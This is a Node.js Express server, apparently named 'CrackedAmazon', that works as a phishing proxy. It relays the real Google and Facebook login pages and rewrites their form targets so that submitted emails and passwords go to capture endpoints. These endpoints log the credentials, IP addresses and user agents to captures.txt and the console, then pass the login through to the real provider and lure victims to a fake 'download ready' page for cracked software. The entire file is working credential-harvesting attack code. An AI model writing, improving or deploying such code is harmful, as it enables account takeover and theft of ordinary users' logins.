const express = require('express');
const { createProxyMiddleware, fixRequestBody } = require('http-proxy-middleware');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(session({
    secret: 'crackedamazon-secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.static(__dirname));

// Capture storage
const captures = [];

// ============================================
// GOOGLE AUTH - FETCHES REAL LOGIN PAGE
// ============================================
app.get('/auth/google', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    
    createProxyMiddleware({
        target: 'https://accounts.google.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        logLevel: 'error',
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                // Rewrite form action to point to capture endpoint
                body = body.replace(/action="\/v3\/signin\/challenge\/pwd"/g, 'action="/capture/google"');
                body = body.replace(/action="\/v3\/signin\/challenge"/g, 'action="/capture/google"');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});

// ============================================
// FACEBOOK AUTH - FETCHES REAL LOGIN PAGE
// ============================================
app.get('/auth/facebook', (req, res, next) => {
    const tool = req.query.tool || 'unknown';
    req.session.tool = tool;
    
    createProxyMiddleware({
        target: 'https://www.facebook.com',
        changeOrigin: true,
        secure: false,
        followRedirects: true,
        logLevel: 'error',
        onProxyRes: (proxyRes, req, res) => {
            let body = '';
            proxyRes.on('data', chunk => { body += chunk; });
            proxyRes.on('end', () => {
                // Rewrite Facebook form action
                body = body.replace(/action="\/login\/device-based\/validate-password\/"/g, 'action="/capture/facebook"');
                body = body.replace(/action="\/login\/"/g, 'action="/capture/facebook"');
                res.setHeader('Content-Type', 'text/html');
                res.send(body);
            });
        }
    })(req, res, next);
});

// ============================================
// GOOGLE CAPTURE - SAVES CREDENTIALS + FORWARDS
// ============================================
app.post('/capture/google', (req, res, next) => {
    const { email, password } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const capture = {
        timestamp: new Date().toISOString(),
        provider: 'google',
        email,
        password,
        tool,
        ip,
        userAgent: req.headers['user-agent']
    };
    
    captures.push(capture);
    fs.appendFileSync('captures.txt', JSON.stringify(capture) + '\n');
    console.log(`✅ GOOGLE CAPTURED: ${email}:${password} for ${tool}`);
    
    // Forward to correct Google endpoint
    req.url = '/v3/signin/challenge/pwd';
    req.target = 'https://accounts.google.com';
    next();
});

// Google proxy with fixRequestBody
app.use('/capture/google', createProxyMiddleware({
    target: 'https://accounts.google.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    onProxyReq: fixRequestBody, // CRITICAL FIX
    onProxyRes: (proxyRes, req, res) => {
        console.log(`↪️ Google response: ${proxyRes.statusCode}`);
        // If login successful, redirect to download
        if (proxyRes.statusCode === 302 || proxyRes.statusCode === 200) {
            const tool = req.session.tool || 'tool';
            res.redirect(`/download?tool=${tool}`);
        }
    }
}));

// ============================================
// FACEBOOK CAPTURE - SAVES CREDENTIALS + FORWARDS
// ============================================
app.post('/capture/facebook', (req, res, next) => {
    const { email, pass } = req.body;
    const tool = req.session.tool || 'unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    const capture = {
        timestamp: new Date().toISOString(),
        provider: 'facebook',
        email,
        password: pass,
        tool,
        ip,
        userAgent: req.headers['user-agent']
    };
    
    captures.push(capture);
    fs.appendFileSync('captures.txt', JSON.stringify(capture) + '\n');
    console.log(`✅ FACEBOOK CAPTURED: ${email}:${pass} for ${tool}`);
    
    // Forward to correct Facebook endpoint
    req.url = '/login/device-based/validate-password/';
    req.target = 'https://www.facebook.com';
    next();
});

// Facebook proxy with fixRequestBody
app.use('/capture/facebook', createProxyMiddleware({
    target: 'https://www.facebook.com',
    changeOrigin: true,
    secure: false,
    followRedirects: true,
    logLevel: 'error',
    onProxyReq: fixRequestBody, // CRITICAL FIX
    onProxyRes: (proxyRes, req, res) => {
        console.log(`↪️ Facebook response: ${proxyRes.statusCode}`);
        // If login successful, redirect to download
        if (proxyRes.statusCode === 302 || proxyRes.statusCode === 200) {
            const tool = req.session.tool || 'tool';
            res.redirect(`/download?tool=${tool}`);
        }
    }
}));

// ============================================
// DOWNLOAD PAGE - AFTER SUCCESSFUL LOGIN
// ============================================
app.get('/download', (req, res) => {
    const tool = req.query.tool || req.session.tool || 'tool';
    const toolName = tool.replace(/-/g, ' ');
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Download • CrackedAmazon</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); color: white; text-align: center; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
            .card { background: rgba(255,255,255,0.05); backdrop-filter: blur(10px); border-radius: 24px; padding: 40px; max-width: 450px; width: 100%; border: 1px solid rgba(249,115,22,0.3); box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
            .success { color: #10b981; font-size: 72px; margin-bottom: 20px; animation: bounce 2s infinite; }
            @keyframes bounce { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
            h2 { color: #f97316; margin-bottom: 15px; font-size: 32px; font-weight: 700; }
            .tool-name { background: rgba(249,115,22,0.2); padding: 8px 16px; border-radius: 50px; display: inline-block; margin-bottom: 20px; font-size: 14px; color: #f97316; }
            .btn { background: linear-gradient(135deg, #f97316, #ef4444); color: white; padding: 16px 32px; border: none; border-radius: 50px; font-size: 18px; font-weight: 600; margin: 25px 0 20px; cursor: pointer; width: 100%; transition: transform 0.3s; }
            .btn:hover { transform: scale(1.02); }
            .note { color: #94a3b8; font-size: 13px; }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="success">✓</div>
            <h2>Download Ready</h2>
            <div class="tool-name">${toolName}</div>
            <p style="color: #cbd5e1; margin-bottom: 20px;">Verification successful! Your file is ready.</p>
            <button class="btn" onclick="startDownload()">Download Now</button>
            <div class="note">⚡ 2,304 downloads today • 100% safe</div>
        </div>
        <script>
            function startDownload() {
                alert('Download started! Check your downloads folder.');
                document.querySelector('.btn').style.background = '#22c55e';
                document.querySelector('.btn').textContent = 'Downloading...';
            }
            setTimeout(() => {
                alert('Download started automatically!');
            }, 3000);
        </script>
    </body>
    </html>
    `);
});

// Health check for Render
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// Root endpoint - serve index.html
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log('\n' + '='.repeat(60));
    console.log('🔥 CRACKEDAMAZON PROXY - FULLY FIXED');
    console.log('='.repeat(60));
    console.log(`\n📍 Server running on port ${PORT}`);
    console.log('✅ Google & Facebook proxies active');
    console.log('✅ fixRequestBody enabled - no more 405 errors');
    console.log(`✅ Captures saved to: captures.txt`);
    console.log('\n' + '='.repeat(60) + '\n');
});
